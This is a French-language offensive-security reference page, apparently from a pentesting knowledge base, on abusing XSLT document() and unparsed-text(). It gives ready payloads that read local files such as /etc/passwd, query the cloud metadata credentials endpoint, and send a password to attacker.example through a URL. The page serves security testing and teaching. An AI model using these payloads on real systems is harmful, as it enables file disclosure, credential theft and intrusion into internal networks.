---
title: "Abus de la fonction document : lecture de fichier et SSRF pendant les transformations"
description: "La fonction XSLT document() résout des URI contrôlées par l'attaquant au moment de la transformation, donnant lecture de fichier local et server-side request forgery contre des points d'accès internes."
keywords:
  - fonction document XSLT
  - lecture de fichier document
  - SSRF XSLT
  - métadonnées cloud
  - unparsed-text
---

# Abus de la fonction document

`document()` est le résolveur d'URI de XSLT : elle récupère une ressource, la parse comme du XML et renvoie l'arbre de nœuds pour que la feuille de style le traite. Lorsqu'un attaquant contrôle l'argument, ou contrôle le texte de feuille de style qui l'appelle, la transformation récupère une ressource du choix de l'attaquant tout en s'exécutant avec l'accès au système de fichiers et au réseau du serveur. Le contenu résolu circule alors dans la sortie, donc les résultats de lecture de fichier comme de request forgery reviennent directement dans la réponse.

## Lecture de fichier local

Une URI `file://` lit un document depuis le disque. Injectée dans une valeur qui atteint l'argument, ou écrite dans une feuille de style influencée par l'attaquant, elle expose des fichiers locaux dans la sortie :

```xml
<xsl:value-of select="document('file:///etc/passwd')"/>
<xsl:copy-of select="document('file:///opt/app/WEB-INF/web.xml')"/>
```

`document()` parse sa cible comme du XML, donc elle lit proprement les fichiers en forme XML ; pour du texte arbitraire, XSLT 2.0 et versions ultérieures fournissent `unparsed-text()`, qui renvoie les octets bruts et n'exige pas de balisage bien formé :

```xml
<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
<xsl:value-of select="unparsed-text('/proc/self/environ')"/>
```

Un fichier non-XML passé à `document()` déclenche une erreur de parsing, et quand le moteur renvoie cette erreur il fuite de toute façon le contenu du fichier et les chemins absolus, un repli utile là où `unparsed-text` est indisponible.

## Server-side request forgery

La même fonction accepte les URI `http://` et `https://`, transformant le moteur de transformation en un proxy de requêtes positionné à l'intérieur du périmètre réseau :

```xml
<xsl:copy-of select="document('http://internal-admin.svc.local/users.xml')"/>
```

`document()` parse la réponse comme du XML, donc elle intègre directement les réponses XML ; un point d'accès qui renvoie du texte brut ou du JSON (y compris le service de métadonnées cloud) fait échouer le parsing XML, mais la requête part quand même, ce qui suffit pour un SSRF aveugle et, là où le moteur renvoie l'erreur de parsing, fuite souvent de toute façon le corps de la réponse. Pour lire proprement une réponse en texte ou JSON dans la sortie, utilisez `unparsed-text()` :

```xml
<xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
<xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-readonly')"/>
```

Le service de métadonnées cloud est la cible la plus précieuse parce que la réponse de credentials revient directement dans la sortie rendue. Les panneaux d'administration réservés en interne, les API de service et les points d'accès de santé sont accessibles de la même façon. Là où la réponse n'est pas reflétée, la requête part quand même, donc une URI pointée vers un hôte contrôlé par l'attaquant confirme le SSRF aveugle et transporte des données via le chemin ou la chaîne de requête :

```xml
<xsl:value-of select="document(concat('http://attacker.example/x?d=', encode-for-uri(//user[1]/password)))"/>
```

## Injection pilotée par paramètre

Même une feuille de style que l'attaquant ne peut pas éditer est exploitable quand l'application passe une valeur de requête en tant que paramètre de feuille de style que la transformation fournit ensuite à `document()` :

```xml
<xsl:param name="src"/>
<xsl:value-of select="document($src)"/>
```

Définir `src` à `file:///etc/hostname` ou à une URL interne réutilise les mêmes primitives sans toucher au corps de la feuille de style, le cas courant dans les fonctionnalités de rapport et de template qui laissent les utilisateurs pointer une transformation vers une source de données choisie.

## Outils

- **Burp Suite** : injection de charges utiles `document()` et `unparsed-text()` dans Repeater.
- **Burp Collaborator** : confirmation du SSRF aveugle depuis les récupérations au moment de la transformation.
- Tests manuels avec des charges utiles d'URI `file://` et `http://` internes.

## Références

- [W3C XSLT 2.0: The document() Function](https://www.w3.org/TR/xslt20/#document)
- [PortSwigger: XML and XSLT](https://portswigger.net/kb/issues/00100f10_xslt-injection)
